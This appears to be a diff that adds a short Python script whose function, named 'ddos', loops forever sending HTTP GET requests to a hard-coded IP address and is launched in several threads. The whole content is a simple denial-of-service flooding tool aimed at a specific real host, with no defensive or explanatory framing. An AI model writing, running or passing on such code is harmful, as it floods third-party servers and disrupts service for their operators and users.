@@ -1,3 +1,8 @@
+import threading
+import requests
+def ddos():
+    while True:
+        url = requests.get("http://74.91.127.117/")
 test1 = threading.Thread(target=ddos)
 test1.start()
 test2 = threading.Thread(target=ddos)
